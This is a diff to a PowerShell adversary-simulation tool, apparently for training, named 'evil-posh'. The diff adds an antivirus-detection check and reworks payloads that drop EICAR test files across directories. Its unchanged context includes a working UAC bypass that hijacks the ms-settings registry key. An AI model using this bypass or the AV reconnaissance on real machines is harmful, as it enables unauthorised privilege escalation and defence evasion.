@@ -3,22 +3,37 @@ $scriptPath = $PSScriptRoot
 Import-Module "$($scriptPath)\lib\Write-Ascii.psm1"
 
 $global:Payload = 0
-$global:Path = "C:\"
+[string] $global:Path = "C:\"
 $global:Persist = 0
+$global:PayloadChoice = "None"
+$global:Output = "Ready"
+$global:AvCheckResult = $AntiVirusNames
+
+$AVCheck = {
+    $wmiQuery = "SELECT * FROM AntiVirusProduct"    
+    $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery       
+    [array]$AntivirusNames = $AntivirusProduct.displayName       
+    $AvFinal = Switch($AntivirusNames) {
+        {$AntivirusNames.Count -eq 0}{"Anti-Virus is NOT installed!";Continue}
+        {$AntivirusNames.Count -eq 1 -and $_ -eq "Windows Defender"} {"ONLY Windows Defender is installed!";Continue}
+        {$_ -ne "Windows Defender"} {"Anti-Virus is installed ($_)."}
+    }
+    $global:Output = $AvFinal
+}
 
 $nuke = {
-    # $global:Path = [Environment]::GetFolderPath("MyDocuments")
     $enum = Get-ChildItem -Recurse -Directory $global:Path
     foreach($dir in $enum){
-        Write-Host "Found directory.." $dir
+        $a++
         $name = Get-Random
         [string] $EncodedEicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
         [byte[]] $EicarBytes = [System.Convert]::FromBase64String($EncodedEicar)
         [string] $Eicar = [System.Text.Encoding]::UTF8.GetString($EicarBytes)
         [string] $FilePath = New-Item -Path (Join-Path $dir $name) -ItemType File -Force
         Set-Content -Value $Eicar -Encoding ascii -Path $FilePath -Force
-        Write-Host "Wrote " $name " to " $dir
     }
+    $global:Output = "Wrote EICAR file to $($a) directories."
+    Clear-Host
 }
 
 $enum = {
@@ -26,8 +41,7 @@ $enum = {
         foreach($dir in $enum){
             $i++
         }
-        Write-Host "`nFound " $i " directories"
-        Start-Sleep 2
+        $global:Output = "Found $($i) directories."
         Clear-Host
 }
 
@@ -56,9 +70,13 @@ Function Show-Menu {
     param(
         [string]$Title = "Main Menu"
     )
+    $jollyroger = "`n888888888888888888888888888888888888888888888888888888888888`n888888888888888888888888888888888888888888 github:rcreecy 88`n8888888888888888888888888P`"`"  `"`"9888888888888888888888888888`n8888888888888888P`"88888P          988888`"9888888888888888888`n8888888888888888  `"9888            888P`"  888888888888888888`n888888888888888888bo `"9  d8o  o8b  P`" od88888888888888888888`n888888888888888888888bob 98`"  `"8P dod88888888888888888888888`n888888888888888888888888    db    88888888888888888888888888`n88888888888888888888888888      8888888888888888888888888888`n88888888888888888888888P`"9bo  odP`"98888888888888888888888888`n88888888888888888888P`" od88888888bo `"98888888888888888888888`n888888888888888888   d88888888888888b   88888888888888888888`n8888888888888888888oo8888888888888888oo888888888888888888888`n888888888888888888888888888888888888888888888888888888888888"
+    Write-Host $jollyroger
     Write-Ascii "evil-posh"
-    Write-Host "`nTraining scenario powershell execution examples`n"
-    Write-Host $PSCommandPath
+    Write-Host "Training scenario powershell execution examples`n"
+    Write-Host "PATH: $($global:Path)"
+    Write-Host "PAYLOAD: $($global:PayloadChoice)"
+    Write-Host "OUTPUT: $($global:Output)"
     Write-Host "`n====================== $Title ======================="
     Write-Host "BYPASS - Attempt to launch tool as administrator without UAC prompt"
     Write-Host "PATH - Set main path to execute directory based payloads against (Defaults to 'C:\')"
@@ -69,14 +87,14 @@ Function Show-Menu {
 }
 
 Function Set-Path{
-    $global:Path = Read-Host "PATH"
-    Write-Host "PATH set to " $global:Path
-    Start-Sleep 2
+    $global:Path = Read-Host -Prompt "PATH"
+    Clear-Host
+    $global:Output = "PATH set to $($global:Path)"
     Clear-Host
 }
 
 Function Set-Payload{
-    Write-Host `n"PAYLOAD OPTIONS:`nENUM - List out directories and subdirectories from the base (PATH)`nNUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`nWHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window"
+    Write-Host `n"PAYLOAD OPTIONS:`nENUM - List out directories and subdirectories from the base (PATH)`nNUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`nWHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window`nAVCHECK - Check presence of current AV on system"
     $global:PayloadChoice = Read-Host "`nCHOICE"
     if($global:PayloadChoice -eq 'ENUM'){
         $global:Payload = 1
@@ -87,12 +105,14 @@ Function Set-Payload{
         $global:Payload = 2
     } elseif($global:PayloadChoice -eq 'WHALE'){
         $global:Payload = 3
-    }else {
+    } elseif($global:PayloadChoice -eq 'AVCHECK'){
+        $global:Payload=4
+    } else {
         Write-Host "Not a valid option"
         return
     }
-    Write-Host "Payload set to " $global:PayloadChoice
-    Start-Sleep 3
+    Clear-Host
+    $global:Output = "Payload set to $($global:PayloadChoice)"
     Clear-Host
 }
 
@@ -104,17 +124,19 @@ Function Start-Payload{
         Invoke-Command -ScriptBlock $nuke
     } elseif($global:Payload -eq 3){
         Invoke-Command -ScriptBlock $whale
+    } elseif($global:Payload -eq 4){
+        Invoke-Command -Scriptblock $AVCheck
     } else {
         Clear-Host
-        Write-Host "An invalid option was provided!"
-        Start-Sleep 2
+        $global:Output = "An invalid option was provided!"
+        Clear-Host
         return
     }
 }
 
 Function Start-Bypass{
     Clear-Host
-    [String]$program = "cmd /c start powershell.exe -noprofile " + $PSCommandPath
+    [String]$program = "cmd /c start powershell.exe -noprofile $($PSCommandPath)"
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
